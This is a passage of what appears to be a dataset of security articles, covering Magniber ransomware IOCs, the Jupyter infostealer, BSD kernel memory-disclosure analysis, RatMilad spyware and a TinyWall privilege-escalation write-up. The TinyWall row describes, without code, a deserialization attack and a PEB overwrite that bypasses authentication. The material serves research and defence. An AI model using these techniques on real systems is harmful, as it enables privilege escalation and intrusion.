talked about the future of UEFI threats, dissected the unique loader we named Wslink, and explained how ESET Research does attribution of malicious threats and campaigns. For the upcoming months, we are happy to invite you to ESET talks at AVAR, Ekoparty, and many others. I wish you an insightful read. ESET Threat Report T2 2022 Follow ESET research on Twitter for regular updates on key trends and top threats. To learn more about how threat intelligence can enhance the cybersecurity posture of your organization, visit the ESET Threat Intelligence page."
7fba9767-f530-5423-9f97-12a8876c3b0c,27-May-2022,"Win11 users beware! Magniber ransomware has been upgraded again, aiming at win11","360 Security Center detected a new attack on the Windows 11 system in the family. The Magniber ransomware disguised as a Windows 10 upgrade patch package has spread widely. The transmission method is still various forums, cracked software websites and fake pornographic websites.","Learn more about 360 Total Security At the end of April this year, the Magniber ransomware disguised as a Windows 10 upgrade patch package and spread widely, and 360 Security Center warned it. Just recently, 360 Security Center detected a new attack on the Windows 11 system in the family. Since May 25, its attack volume has increased significantly, and its main dissemination package names have also been updated, such as: win10-11_system_upgrade_software.msi, covid.warning.readme.xxxxxxxx.msi, etc. The transmission method is still various forums, cracked software websites, fake pornographic websites, etc. When users visit these websites, they are induced to download from third-party network disks. The recent spread of the virus is as follows: The virus program itself has not changed much, and can infect multiple versions of Windows operating systems. The following figure shows the scene of Windows 11 being infected by the virus. The virus uses the RSA+AES encryption scheme when encrypting files. The RSA used is as long as 2048 bits, which is currently difficult to crack technically. After being encrypted by the ransomware, the file suffix is a random suffix, and each victim will have an independent payment page. If the ransom cannot be paid within the specified time, the link will be invalid. If the victim can pay the ransom within 5 days, he only needs to pay 0.09 Bitcoin, and the ransom will be doubled after 5 days. At present, 360 Total Security can support the interception and killing of the ransomware virus. It is recommended that users do not run unknown programs downloaded from unknown websites at will. IOC (part) hxxps://casbin[.]info/campid=18 hxxps://flatis[.]uno/src=6584 hxxps://agorule[.]fun/src=98411 hxxps://vocoto[.]info/src=1990 2e29176531e8c9f9fe10ca6f11d6ba33 6d50b91f8f9811ce287bdfda686e5d96 3947a4b4b888831be48251323611cbdd 8206b320422149d45096ae9a13acfcc5 0163f2973f37fcb176b6f642ce0aca3d Learn more about 360 Total Security"
5f48a39a-9a37-5c10-adfc-93b4ab2ae7b3,07-October-2022,Jupyter Infostealer: Watch BlackBerry Bring It Down to Earth (Video),"Jupyter Infostealer lurks deep within legitimate installer packages to steal sensitive user data. Jupyters can steal log-on credentials, administrative rights, and passwords from browsers. BlackBerry's endpoint protection solution CylanceOPTICS detects and blocks the attacks.","Jupyter Infostealer lurks deep within legitimate installer packages, waiting for any opportunity to steal sensitive user data. After activation, this threat receives executables and malicious PowerShell scripts from its command-and-control (C2) server, including an infostealing module which swipes the user’s log-on credentials, administrative rights, workgroup and browser password databases. Jupyter can also grab cookies from common browsers such as Google Chrome™, Microsoft Edge®, Opera, Brave, and Mozilla Firefox, along with login information and “autofill” data such as the user’s name, physical address, and email. Like many other information stealers, Jupyter also targets crypto wallets, as well as virtual private networks (VPNs) and remote access software. In the past, Jupyter has gone by many names, including SolarMarker / Deimos , Polazert , and Yellow Cockatoo . Malware authors have continued improving its stealth features. For example, Jupyter is often wrapped with .MSIs, which are large Windows® installer packages. Commonly, these packages are signed with legitimate digital certificates. While the packages’ legitimate files run, Jupyter executes malicious actions in the background through a small, well-hidden PowerShell script. The developers of this infostealer do not appear to target specific organizations and seem to lack a fixed agenda. They instead tend to target any user who might fall into Jupyter's deceptive trap which makes it a widespread threat. BlackBerry Stonewalls Jupyter Infostealer Watch our demo video below to learn more about Jupyter Infostealer attacks. See how BlackBerry defeats them using our cloud-enabled Endpoint Detection and Response (EDR) solution CylanceOPTICS® in conjunction with CylancePROTECT®, our artificial intelligence (AI) powered Endpoint Protection Platform (EPP). DEMO VIDEO: BlackBerry vs. Jupyter Infostealer Learn more about Jupyter Infostealer in our deep-dive blog, Threat Thursday: Jupyter Infostealer is a Master of Disguise . Figure 1 – CylanceOPTICS detects each step Jupyter has taken in the system’s registry, providing essential information for threat containment and prevention. Figure 2 – CylancePROTECT intercepts Jupyter immediately, preemptively stopping the attack before any damage occurs. BlackBerry Assistance The BlackBerry Incident Response team can work with organizations of any size and across any vertical, to evaluate and enhance their endpoint security posture and proactively maintain the security, integrity, and resilience of their network infrastructure. For emergency assistance, please email us at DLIR@blackberry.com , or use our handraiser form. Video Transcript In this video we are going to analyze Jupyter, an infostealer – considered a master of deception – that hides deep within legitimate installer packages. We configured our machine with CylanceOPTICS ® in “audit only” mode to allow Jupyter's execution. In this case, the file appears to be an installer of a legitimate known PDF reader that is more than 100 megabytes in size and does not trigger any alert on the system. It is a signed document with a valid certificate. However, deep within the code resides a relatively small, heavily obfuscated and encrypted PowerShell script that will run in the background. It looks just like a legitimate application, and it goes with the actual installation process. Upon infection, it applies persistence on the registry and adds itself to the startup applications. Afterward, the attacker can deploy modules to steal user credentials and information across well-known internet browsers and crypto wallets. To better understand what happens in the background, we can look at our root cause analysis on this file, where we can see all the network communication that has happened to download the necessary malicious files. We can also see the steps taken by this malware on our ‘detections’ tab with all the alerts that have been triggered from a process without common executable extensions, as well as what Jupyter has done in the registry to secure its persistence. For additional analysis, we can get more details about this file by identifying its properties, the certificate that has been used to sign the file, how many endpoints it has been detected on, as well as an extensive list of malicious threat indicators. These include the files’ anomalies, collection capabilities, deception, and destruction indicators. When it comes to preventing these types of threats, CylancePROTECT ® provides multiple layers of AI-based prevention to stop the PowerShell script, with script control to intercept its attempt to load the malicious DLL into memory, memory protection, and convicting the file with our machine learning model. Related Reading Mustang Panda Abuses Legitimate Apps to Target Myanmar-Based Victims H0lyGh0st Ransomware: Watch This Unholy Threat ""Meet Its Maker"" (Video) DJVU: The Ransomware That Seems Strangely Familiar..."
b7a120bd-4b50-5cbd-b236-84cd2e491646,21-September-2022,MindShaRE: Analyzing BSD Kernels for Uninitialized Memory Disclosures using Binary Ninja,Control flow insensitive analysis is a way to track memory store operations statically. It can help identify bugs where data is not properly allocated and shared across trust boundaries. The most common bug is disclosure of uninitialized memory when data is copied across trust boundary.,"Disclosure of uninitialized memory is one of the common problems faced when copying data across trust boundaries. This can happen between the hypervisor and guest OS, kernel and user space, or across the network. The most common bug pattern noticed among these cases is where a structure or union is allocated in memory, and some of the fields or padding bytes are not initialized before copying it across trust boundaries. The question is, is it possible to perform variant analysis of such bugs? The idea here is to perform a control flow insensitive analysis to track all memory store operations statically. Any memory region never written to is identified as uninitialized when the data from it is copied across trust boundaries. Generalizing the code pattern for analysis Consider the case of CVE-2018-17155 , a FreeBSD kernel memory disclosure in the getcontext() and swapcontext() system calls due to a lack of structure initialization. Shown below is the patch for sys_getcontext() . The listing on the left shows the patched code. sys_swapcontext() was patched in a similar fashion. Figure 1 - Patch for sys_getcontext() information disclosure. Vulnerable code appears on the right. The vulnerable code declared a ucontext_t structure on the stack, wrote to some but not all fields, and finally used copyout() to copy UC_COPY_SIZE bytes of data from the structure to userland. The problem here is that not all fields are initialized, so any data occupying the uninitialized parts of the structure memory region are disclosed. To solve the problem, the patched code zeroes out the entire structure using the bzero() function. The generalization of the above code pattern looks like this: • A memory region (structure, union, etc.) is declared on the stack or allocated on the heap, which could be the source of uninitialized memory. • The memory region may get fully or partially written. • There is an API that transfers data across trust boundaries. This could be the sink for uninitialized memory. • The API generally takes at least 3 parameters: source buffer, destination buffer, and size. In this case, the source of the memory is a stack offset, and the size of the transfer is a constant value. A constant size of transfer means the value is either the entire size of the memory region (using sizeof operator) or a part of it until an offset. • The memory region may be zeroed out before usage using functions like memset() or bzero() . The sink function is application-specific. To mention a few of the more likely sinks: copy_to_user() in case of Linux kernel, copyout() in case of BSD kernels, send() or sendto() for network transfers or any wrappers around them. The definitions of these functions are either documented, or else understood by reverse engineering if the target is closed source. Searching the code pattern for analysis Once the sink function and its definition are known, we can query for calls to the sink function with a constant size argument and source buffer pointing to a stack offset or heap memory. Querying for a pointer to stack memory is straightforward, whereas detecting heap pointers requires visiting the definition site of source variables. Consider the definition of copyout() function in BSD: copyout(const void *kaddr, void *uaddr, size_t len) When looking for stack memory disclosures, search for cross-references to the copyout() function where kaddr is pointing to a stack offset and the len parameter is a constant. Binary Ninja has a static data flow feature that propagates known values within a function, including stack frame offsets and type information. Using this feature, it is possible to narrow down calls to copyout() that satisfy our search criteria. To understand this better, let’s inspect the arguments passed to copyout() from sys_getcontext() . Figure 2 - sys_getcontext() invoking copyout(kaddr, uaddr, len) The kaddr parameter, or params[0] , holds a kernel stack pointer, is shown as the stack frame offset -0x398. The value for the len parameter, or params[1] , is shown as the constant 0x330. Since Binary Ninja has no information regarding uaddr , this is shown as <undetermined> . With this register type information for kaddr and len , the following query fetches all instances of calls to copyout() with a kernel stack pointer and constant size: Statically tracking memory stores The core idea of the analysis is to track all the memory store operations using Binary Ninja’s static data flow capability and propagate pointers manually using Single Static Assignment (SSA) form whenever necessary. For tracking stack memory stores in local function scope, we rely on Low-Level IL (LLIL), because Medium Level IL (MLIL) abstracts stack access and might eliminate some of the memory stores. For tracking inter-procedure store operations where the address is passed to another function, we rely on the MLIL SSA form to propagate the pointers. The visitor class implemented to handle IL instructions is based on Josh Watson’s Emilator . Tracking stack memory stores with LLIL In LLIL, any instruction writing to memory is represented as an LLIL_STORE operation. It has a source and destination parameter. The idea is to linearly visit each LLIL instruction in a function and check if it is an LLIL_STORE operation having a stack frame offset as its destination. When a memory store writing to stack is identified, we will log the source offset of the write and its size. Consider a simple 8-byte memory move operation and its corresponding LLIL information provided by Binary Ninja: Figure 3 - LLIL_STORE operation in freebsd32_sigtimedwait() The StackFrameOffset value is the offset from the base of the stack and the size property gives the size of the store operation. Using this information, it is possible to know which memory address are being written. In this case, the addresses from stack base offset -116 to -109 (8 bytes) are being initialized. Static function hooks and memory writing APIs While memory store instructions are one way to initialize memory, functions like memset() and bzero() are frequently used to initialize a memory region with NULLs. Similarly, functions such as memcpy() , memmove() , bcopy() , strncpy() , and strlcpy() are also used to write to a memory region. All these functions have something in common: there is a destination memory pointer and a size to write. If the destination and size values are known, it is possible to know the memory region being written to. Consider the case of bzero() , which is used to clear stack memory in the patched sys_getcontext() : Figure 4 - Clearing stack memory using bzero() By querying the destination pointer and size parameters, it is possible to know their respective values and hence the target memory region. Now let us consider how the analyzer can handle CALL operations. Static hooks are handlers to functions which we intend to handle differently compared to other functions. For any CALL instruction with a known destination i.e., MLIL_CONST_PTR , the symbol is fetched to check for static hooks. A JSON configuration with the function names as well their positional parameters (destination buffer and size) is provided to the analyzer for static hooking: The copyin() function is specific to BSD kernels. It is used to initialize kernel buffers with data from user space. Any target-specific functions to hook can be added to the JSON config and handled in visit_function_hooks() as per necessity. Handling x86 REP optimization Many times compilers optimize memory writing functions into REP instructions or a series of store operations. While store operations introduced due to optimization can be handled like any other store operation, REP instructions requires special handling. Static function hooks are not useful in detecting memory writes due to REP. So how do we handle such optimizations and avoid missing those memory writes? First, let’s look at how Binary Ninja translates the REP instruction in LLIL or MLIL. Figure 5 - memcpy() optimized to REP instruction Figure 6 - REP instruction translation in MLIL The REP instruction repeats the string operation until RCX is 0. The direction of copy operation depends on the Direction Flag (DF), hence the branching where one branch increments the source (RSI) and destination (RDI) pointers and the other decrements them. In general, it is reasonably safe to assume that DF will be 0, and that pointers are incremented. When linearly walking through the ILs, the translated REP instruction will look no different from other instructions. The idea is to check for GOTO instruction, and for every GOTO instruction in IL, fetch the disassembly at the same address. If the disassembly is REP instruction, then fetch the destination pointer as well as size arguments and mark the memory region as initialized. The LLIL has a get_possible_reg_values() API to read values of registers statically. The MLIL provides couple of APIs, get_var_for_reg() and get_ssa_var_version() , to map architecture registers to SSA variables. This is very useful when propagating values manually using SSA variables in the absence of RegisterValueType information (i.e. RegisterValueType.UndeterminedValue ). Similar APIs are currently missing in LLIL and tracked as a feature request: API to get SSARegister for a register at a given LLIL instruction . Tracking Inter-procedure memory stores with MLIL At this point we can track memory store operations, CALL operations such as bzero() , memset() , and also deal with REP optimization. The next task is to track memory writes across function calls, as when a caller passes a memory address to a callee. The interesting challenge here is that once a stack pointer has been passed into another function, it can no longer be tracked using the register value type information (StackFrameOffset) as we did within the local function scope using LLIL (see above). To solve this problem, we propagate the pointers within the callee function using MLIL SSA variables, just like propagating taint information. Whenever a MLIL_STORE_SSA instruction is encountered, we log the offset of the write operation and size values whenever the destination of the memory write operation is resolved manually based on values of SSA variables. The set_function_args() function shown below iterates through MLIL variables and assigns the value (pointer) passed by the caller: Once the initial SSA variables are set, we visit all the instructions linearly to propagate the pointer and log memory writes. While doing this, the most common operation performed on the pointer is addition. Therefore, it is necessary to emulate MLIL_ADD instruction to handle pointer arithmetic operations. Additionally, it is also important to emulate instructions such as MLIL_SUB, MLIL_LSR and MLIL_AND to handle certain pointer-aligning operations in case of optimizations. Here is an example of how these MLIL SSA expressions are resolved to log a memory store operation: Considering the SSA variable rax_43#65 as a manually propagated pointer value, it is possible to resolve the destination of the store operation as well as the size of the write. But when the value of the SSA variable rax_43#65 is not available, this memory is not associated with the pointer that was propagated by the caller and therefore not logged. Handling pointer-aligning optimizations When performing inter-procedure analysis, further optimizations were noticed in addition to the REP optimization as seen in the “Handling x86 REP optimization” section above. A variable allocated on the stack will usually be aligned to meet the needs of upcoming operations. Let’s say a stack pointer is passed to memset() and the compiler inlines the call as a REP instruction. In this case, it is very likely the memory will be allocated at an aligned address such that the fastest instructions can be used during REP operation. However, when a pointer is received as an argument by a callee or as a return value of an allocator function, the compiler may have to generate pointer and size alignment opcodes which could rely on branching decisions before reaching REP instruction. Here is an example of such an optimization commonly found in the NetBSD kernel used for analysis: Figure 7 - An example memset() optimization from NetBSD When such branching decisions are involved, the pointer, as well as the size, can take multiple possible values (from the perspective of static analysis) at the point of REP instruction. This is different from what we observed in the “Handling x86 REP optimization"" section where there is only one possible value for pointer and size. Our goal here is to find the actual value of the pointer and size in the absence of pointer-aligning computations. To achieve this, a couple of SSA expressions were identified that can be used to resolve the original value: • Search for an expression involving ( ADDRESS & BYTESIZE ). This could be the first use of ADDRESS before taking any conditional branches. • Search for an expression involving ( SIZE >> 3 ). This is where the adjusted size is passed to a REP instruction. I had a couple of ideas in mind to track back the above expressions from the point of REP instruction, one relying entirely on SSA and the other based on dominators: • Use get_ssa_var_definition() and get_ssa_var_uses() APIs to get a variable’s definition site and its uses. • Alternatively, get the dominators of the basic block containing the REP instruction and visit the instructions in the dominator blocks. The function resolve_optimization() shown below uses dominators to get the basic blocks to perform the search operation. Since the pointer is manually passed by the caller, the value is fetched from the SSA variables. In the case of a possible constant size value, we fetch the maximum from the list of available size values. Once both pointer and size values are available, we log the memory region as initialized. Tracking memory stores in dynamic memory allocations So far, all our analyses were concentrated on stack memory as the source buffer for information disclosure. This is largely due to the prevalence of stack memory disclosure bugs, as described in KLEAK: Practical Kernel Memory Disclosure Detection (PDF) . What about other memory regions such as the heap? Can we model some of the heap memory disclosures too? When looking for heap memory disclosures, the idea remains the same. We are still looking for calls to sink functions with known size value. But instead of the source pointer being RegisterValueType.StackFrameOffset , we check for RegisterValueType.UndeterminedValue . Consider the code for sys_statfs() : Figure 8 - Dynamic memory allocation in sys_statfs() Here the kernel pointer rdi_1#2 in copyout() is undetermined because Binary Ninja does not know what the allocator function returns. However, by using the SSA form, we can manually track back whether rdi_1#2 is holding the return value of malloc() . For example, follow the highlighted instructions in Figure 8. - the variables are assigned as rax_1#1->r15#1->rdi_1#2 . This information can be obtained programmatically using the MLIL get_ssa_var_definition() API. Once the definition site of an SSA variable is obtained, we can check whether the variable is initialized using a CALL operation as demonstrated below: How does the analyzer know the definition of allocator functions? We can take the same approach used for providing information regarding static function hooks (see the “Static function hooks and memory writing APIs” section above). A JSON configuration with a list of allocator functions and an index of size parameters is provided to the analyzer. For any CALL instruction with a known destination (i.e., MLIL_CONST_PTR ), the symbol is fetched to check for known allocator functions. Here is a sample JSON configuration used for analysis: Once we have established the connection between the source pointer and allocator call, the next question is, what pointer value will be assigned as the return value of the allocator call? The stack pointers as tracked as negative offsets in Binary Ninja as seen below: To have a generalized representation between the stack and heap pointers, I decided to set the return value of a heap allocator calls as a negative value of the size of the allocation. For the malloc() call in sys_statfs() , rax_1#1 is set to -0x1d8 as the starting address. Therefore, the memory region which needs to be initialized ranges from -0x1d8 to 0 [start + size of allocation]. Even when the allocation size is undetermined, starting address can be set to some arbitrary value such as -0x10000. All that matters here is to know whether the contiguous memory region accessed by copyout() is initialized or not. Filtering memory stores using dominators and post dominators A dominator in graph theory provides information on the order of execution of some basic blocks. While we have already used dominators for handling pointer-aligning optimizations in the “Handling pointer aligning optimizations” section, this section details the usage of dominators in detecting control flow-sensitive memory store operations. To analyze uninitialized memory disclosures, we explore two ideas: dominators and post-dominators. A basic block X is said to dominate another basic block Y if all paths to Y should go through X. A basic block Y is said to post-dominate basic block X if all paths from X to any of the function’s return blocks should go through Y. Consider this example from Wikipedia: Figure 9 - Graph demonstrating dominators and post dominators In the provided graph, node B dominates nodes C, D, E, and F because all paths to these nodes must go through node B. By definition, every node dominates itself, so the set of all nodes dominated by node B will be B, C, D, E, and F. Also, node A dominates all the nodes in the graph. Therefore, the dominators of nodes C, D, E, F are A and B. Similarly, when A is considered as the function entry node, with E and F being exit nodes, node B is the post-dominator of node A. This is because all paths from A to the exit nodes must go through B. Now, how can dominators and post-dominators help us in this analysis? We can perform dominator analysis on the callers of the sink function. The idea is to log only memory stores in basic blocks which dominate the basic block calling copyout() , that is, basic blocks which will be executed irrespective of branching decisions. Consider the code below: Figure 10 - Dominators of basic block calling copyout() Here the basic block calling copyout() is <mlil block: x86_64@32-35> and there are five dominator blocks in the path from the function entry to copyout() . When performing dominator-based analysis, we will log only memory stores within these five dominator blocks. The memory store operations in other basic blocks might be skipped and not execute. The same is the case with the callee function. We will perform an inter-procedure analysis only when the function is called from a dominator block. Post-dominator analysis is done on the callee function during an inter-procedure analysis. It is meant to find bugs where a callee can possibly return before initializing the memory region it is supposed to. Consider the callee function do_sys_waitid() from figure 10. Figure 11 - Post dominators of function entry block in do_sys_waitid() The function entry block <mlil block: x86_64@0-8> is always executed. The other basic blocks that are executed irrespective of the branching decisions are <mlil block: x86_64@14-22> and <mlil block: x86_64@8-9> . Once again, memory stores and callee analysis are limited only to these three basic blocks. Dominator- and post-dominator-based analysis tries to fill the gaps in control flow insensitive analysis performed by the analyzer. The general assumption here is that memory is initialized or cleared before performing further operations and therefore dominates other basic blocks. However, this assumption is not always true. For example, there are cases where individual code paths can perform the same operation as done in the dominators. Moreover, when a callee returns due to any error condition, the return value could be validated by the caller before calling copyout() . Consequently, dominator-based analysis as done in this implementation is prone to large numbers of false positives. Checking for uninitialized memory disclosures Once all the memory store operations are statically logged with information on offset and size of write, the memory region copied out to user space using copyout() can be evaluated for uninitialized memory disclosure. Consider the call to copyout() shown below: The source pointer is -0x398 and the size copied is 0x330 bytes. Therefore, the analyzer has to validate if all the bytes in the memory range from -0x398 to (-0x398 + 0x330) are initialized, and if not, flag that as a bug. False positives and limitations The analyzer is written with the goal of finding memory regions that never get written to in any possible code paths. False positives occur in cases when it is unable to track a memory store operation. Below are some common false positive conditions and limitations of the implementation: • The analyzer does not emulate branching instructions. Therefore, false positives are seen in code constructs involving control flow decisions. Consider a memory region such as an array that is initialized in a loop operation. In this case, the store operation would be detected only once because the loop body is visited only once by the analyzer, and not in a loop as it would be during execution. • Indirect calls are not resolved statically. Consequently, any memory store done during indirect calls is not tracked. • Optimizations may make it harder to track memory stores. Some common optimizations noticed were tackled in the “Handling x86 REP optimization” and “Handling pointer aligning optimizations” sections. • Binary Ninja may wrongly detect type information of functions used for static hooking or sink functions like copyout() . Since our analysis relies on RegisterValueType information, any failure to accurately detect the function prototype may lead to false results. Verify the type information before analysis and update if necessary. • The analyzer looks only for code patterns where the memory source and sink function are within the same function. There is no tracking back of memory source beyond the local function scope. • Dominator analysis is experimental. You should use it only as a guideline to perform code reviews. When there is access to source code, some of these false positives can be resolved by changing the optimization flags or by unrolling loops to reduce branching decisions. Analysis and results The target kernel executable is loaded in Binary Ninja to generate the BNDB analysis database. Then the analyzer is executed against the database for faster analysis. There are a couple of scripts: one for analyzing stack memory disclosures and another for analyzing sink functions with known size and unknown source pointer. Since the source pointer could be from a heap allocator, provide a JSON configuration with a list of allocator functions as an argument. The dominator analysis is experimental. You need to enable it using an optional argument when needed: Conclusion The scripts were tested on Binary Ninja version 2.4.2846 against FreeBSD 11.4, NetBSD 9.2, and OpenBSD 6.9 kernels. Amongst the results, code paths that are possibly reachable for an unprivileged user were evaluated. The OpenBSD bugs were found in sysctls related to multicast routing in IPv4 as well as IPv6, which are tracked as ZDI-22-073 and ZDI-22-012 respectively. The four vulnerabilities ( ZDI-22-075 , ZDI-22-1036 , ZDI-22-1037 , ZDI-22-1067 ) found in NetBSD are related to syscalls supporting backward compatibility for older NetBSD releases ZDI-22-075 and ZDI-22-1036 are information disclosures in VFS syscalls for NetBSD 3.0 and NetBSD 5.0 respectively. Details regarding the fixes can be found here . Next, ZDI-22-1037 is an information disclosure in getkerneinfo syscall for NetBSD 4.3. This bug was fixed with many other potential issues as seen here . Finally, ZDI-22-1067 is another information disclosure related to VFS syscalls but in NetBSD 2.0 compatibility. Details regarding the fix can be found here . The FreeBSD bug found in version 11.4 was also related to compatibility, which in this case for supporting 32-bit binaries. However, this bug was fixed without a disclosure during a large change done for the 64-bit inode . The uninitialized structure fields were cleared in the copy_stat function as part of the 64-bit inode project. Though this commit was in May 2017, it was tagged to release 12.0 and above. Therefore, the bug remained unfixed in release 11.4 until it reached EOL in September 2021, soon after our bug report. Putting it together, most of the bugs were found in BSD’s compatibility layers. Additionally, all these bugs are stack memory disclosures. For anyone interested, the source code for the project can be found here . You can find me on Twitter @RenoRobertr , and follow the team on Twitter or Instagram for the latest in exploit techniques and security patches. Acknowledgments and references — Various blog posts from Trail of Bits on Binary Ninja — Josh Watson for various projects using Binary Ninja. The visitor class implementation is based on emilator — Jordan for all the code snippets and the Binary Ninja slack community for answering various questions — KLEAK: Practical Kernel Memory Disclosure Detection by Thomas Barabosch and Maxime Villard — Solving Uninitialized Stack Memory on Windows by Joe Bialek — Building Faster AMD64 Memset Routines by Joe Bialek"
a9dec0bd-6677-5765-8d92-8b0ae5977e85,11-December,When a false flag doesn’t work: Exploring the digital-crime underground at campaign preparation stage,Malicious document potentially attributed to APT group APT34 / OilRig was released in October 2020.    the author of the malicious document signed the document with a nickname linked to a member of the already mentioned threat group.  the report suggests a deliberate attempt to deceive security researchers.,"At the beginning of October 2020 we found copy of a malicious document potentially to be attributed to an APT group known with the name of APT34 / OilRig. The attribution, based on several elements found within the malicious document, was firstly reported by a security researcher through a social network. According the extracted evidences, the author “signed” this malicious document leaving his/her username within the document metadata. This nickname was already widely known within the Cyber Threat Intelligence field because attributed to a member of the already mentioned threat group. Indeed this nickname is Iamfarhadzadeh, linked to Mohammad Farhadzadeh, believed to be a member of the hacking unit identified by the community as APT34 / OilRig. Considering this threat and proceeding further with our analysis we extracted several evidences that highlighted a connection with a common cyber-crime adversary. In particular the execution of the hidden macro permitted to download a copy of a malicious executable identified as a variant of AgentTesla that, to the best of our information, has no ties to the already reported threat actor. These evidences headed our research team to dig further in order to understand who was behind this campaign and why that nickname was left within the meta-content. Our first hypothesis was a deliberate attempt to deceive security researchers pushing them to attribute the malicious campaign to a cyber-espionage operation by releasing a malicious document linked to a socio-politic event. Download the full PDF report below: Adversary Tracking Report Check more related articles on our blog ."
bf265282-5035-5725-b15e-6162ac88a9c4,05-October-2022,Experts Warn of New RatMilad Android Spyware Targeting Enterprise Devices,Malware called RatMilad has been observed targeting Middle Eastern enterprise mobile devices. The malware is a novel Android trojan that functions as a VPN and phone number spoofing app. Zimperium says the malicious app is distributed through links on social media and Telegram. the malware collects and exfiltrates a wide variety of data from the infected device.,"A novel Android malware called RatMilad has been observed targeting a Middle Eastern enterprise mobile device by concealing itself as a VPN and phone number spoofing app. The mobile trojan functions as advanced spyware with capabilities that receives and executes commands to collect and exfiltrate a wide variety of data from the infected mobile endpoint, Zimperium said in a report shared with The Hacker News. Evidence gathered by the mobile security company shows that the malicious app is distributed through links on social media and communication tools like Telegram, tricking unsuspecting users into sideloading the app and granting it extensive permissions. The idea behind embedding the malware within a fake VPN and phone number spoofing service is also clever in that the app claims to enable users to verify social media accounts via phone, a technique popular in countries where access is restricted. ""Once installed and in control, the attackers could access the camera to take pictures, record video and audio, get precise GPS locations, view pictures from the device, and more,"" Zimperium researcher Nipun Gupta said. Other features of RatMilad, which is spread through apps named Text Me and NumRent, make it possible for the malware to amass SIM information, clipboard data, SMS messages, call logs, contact lists, and even perform file read and write operations. Zimperium hypothesized that the operators responsible for RatMilad acquired source code from an Iranian hacker group dubbed AppMilad and integrated it into a fraudulent app for distributing it to unwitting users. The scale of the infections is unknown, but the cybersecurity company said it detected the spyware during a failed compromise attempt of a customer's enterprise device. A post shared on a Telegram channel used to propagate the malware sample has been viewed over 4,700 times with more than 200 external shares, indicating a limited scope. ""The RatMilad spyware and the Iranian-based hacker group AppMilad represent a changing environment impacting mobile device security,"" Richard Melick, director of mobile threat intelligence at Zimperium, said. ""From Pegasus to PhoneSpy , there is a growing mobile spyware market available through legitimate and illegitimate sources, and RatMilad is just one in the mix."""
c4d71686-332e-5387-9081-fda8d13174be,17-January-2020,CVE-2019-19470: Rumble in the Pipe,Vulnerability in TinyWall allows privilege escalation from a local user to SYSTEM in versions prior to 2.1.13. The vulnerability is caused by a flaw in Named Pipe communication. TinyWall is a local firewall written in.NET and listens on a Named Pipe.,"This blog post describes an interesting privilege escalation from a local user to SYSTEM for a well-known local firewall solution called TinyWall in versions prior to 2.1.13. Besides a .NET deserialization flaw through Named Pipe communication, an authentication bypass is explained as well. Introduction TinyWall is a local firewall written in .NET. It consists of a single executable that runs once as SYSTEM and once in the user context to configure it. The server listens on a Named Pipe for messages that are transmitted in the form of serialized object streams using the well-known and beloved BinaryFormatter . However, there is an additional authentication check that we found interesting to examine and that we want to elaborate here a little more closely as it may also be used by other products to protect themselves from unauthorized access. For the sake of simplicity the remaining article will use the terms Server for the receiving SYSTEM process and Client for the sending process within an authenticated user context, respectively. Keep in mind that the authenticated user does not need any special privileges (e.g. SeDebugPrivilege) to exploit this vulnerability described. Named Pipe Communication Many (security) products use Named Pipes for inter-process communication (e.g. see Anti Virus products). One of the advantages of Named Pipes is that a Server process has access to additional information on the sender like the origin Process ID, Security Context etc. through Windows' Authentication model. Access to Named Pipes from a programmatic perspective is provided through Windows API calls but can also be achieved e.g. via direct filesystem access. The Named Pipe filessystem (NPFS) is accessible via the Named Pipe's name with a prefix \\.\pipe\ . The screenshot below confirms that a Named Pipe ""TinyWallController"" exists and could be accessed and written into by any authenticated user. Talking to SYSTEM First of all, let's look how the Named Pipe is created and used. When TinyWall starts, a PipeServerWorker method takes care of a proper Named Pipe setup. For this the Windows API provides System.IO.Pipes.NamedPipeServerStream with one of it's constructors taking a parameter of System.IO.Pipes.PipeSecurity . This allows for fine-grained access control via System.IO.PipeAccessRule objects using SecurityIdentifiers and alike. Well, as one can observe from the first screenshot above, the only restriction seems to be that the Client process has to be executed in an authenticated user context which doesn't seem to be a hard restriction after all. But as it turned out (again take a look at the screenshot above) an AuthAsServer() method is implemented to do some further checking. What we want is to reach the ReadMsg() call, responsible for deserializing the content from the message received. If the check fails, an InvalidOperationException with ""Client authentication failed"" is thrown. Following the code brought us to a ""authentication check"" based on Process IDs, namely checking if the MainModule.FileName of the Server and Client process match . The idea behind this implementation seems to be that the same trusted TinyWall binary should be used to send and receive well-defined messages over the Named Pipe. Since the test for equality using the MainModule.FileName property could automatically be passed when the original binary is used in a debugging context , let's verify the untrusted deserialization with a debugger first. Testing the deserialization Thus, to test if the deserialization with a malicious object would be possible at all, the following approach was taken. Starting (not attaching) the TinyWall binary out of a debugger ( dnSpy in this case) would fulfill the requirement mentioned above such that setting a breakpoint right before the Client writes the message into the pipe would allow us to change the serialized object accordingly. The System.IO.PipeStream.writeCore() method in the Windows System.Core.dll is one candidate in the process flow where a breakpoint could be set for this kind of modification. Therefore, starting the TinyWall binary in a debugging session out of dnSpy and setting a breakpoint at this method immediately resulted in the breakpoint being hit. Now, we created a malicious object with ysoserial.NET and James Forshaw's TypeConfuseDelegate gadget to pop a calc process. In the debugger, we use System.Convert.FromBase64String(""..."") as expression to replace the current value and also adjust the count accordingly. Releasing the breakpoint resulted in a calc process running as SYSTEM . Since the deserialization took place before the explicit cast was triggered, it was already to late. If one doesn't like InvalidCastExceptions , the malicious object could also be put into a TinyWall PKSoft.Message object's Arguments member, an exercise left to the reader. Faking the MainModule.FileName After we have verified the deserialization flaw by debugging the client, let's see if we can get rid of the debugging requirement. So somehow the following restriction had to be bypassed: The GetNamedPipeClientProcessId() method from Windows API retrieves the client process identifier for the specified Named Pipe. For a final proof-of-concept Exploit.exe our Client process somehow had to fake its MainModule.FileName property matching the TinyWall binary path. This property is retrieved from System.Diagnostics.ProcessModule's member System.Diagnostics.ModuleInfo.FileName which is set by a native call GetModuleFileNameEx() from psapi.dll . These calls are made in System.Diagnostics.NtProcessManager expressing the transition from .NET into the Windows Native API world. So we had to ask ourselves if it'd be possible to control this property. As it turned out this property was retrieved from the Process Environment Block (PEB) which is under full control of the process owner. The PEB by design is writeable from userland. Using NtQueryInformationProcess to get a handle on the process' PEB in the first place is therefore possible. The _PEB struct is built of several entries as e.g. PRTL_USER_PROCESS_PARAMETERS ProcessParameters and a double linked list PPEB_LDR_DATA Ldr . Both could be used to overwrite the relevant Unicode Strings in memory. The first structure could be used to fake the ImagePathName and CommandLine entries but more interesting for us was the double linked list containing the FullDllName and BaseDllName . These are exactly the PEB entries which are read by the Windows API call of TinyWall's MainModule.FileName code. There is also a nice Phrack article from 2007 explaining the underlying data structures in great detail. Fortunately, Ruben Boonen (@FuzzySec) already did 